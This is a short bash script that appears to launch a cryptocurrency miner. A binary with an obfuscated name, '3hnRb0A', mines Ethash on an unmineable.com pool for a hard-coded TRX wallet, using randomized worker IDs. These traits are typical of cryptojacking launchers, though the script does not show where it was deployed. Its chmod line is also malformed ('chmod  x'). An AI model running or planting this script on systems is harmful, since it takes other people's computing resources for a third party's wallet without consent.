#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TKn86pR1YUFVfruZnZaPcSRDTVdjwXbsXo
WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-LGK)

chmod  x 3hnRb0A
./3hnRb0A --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
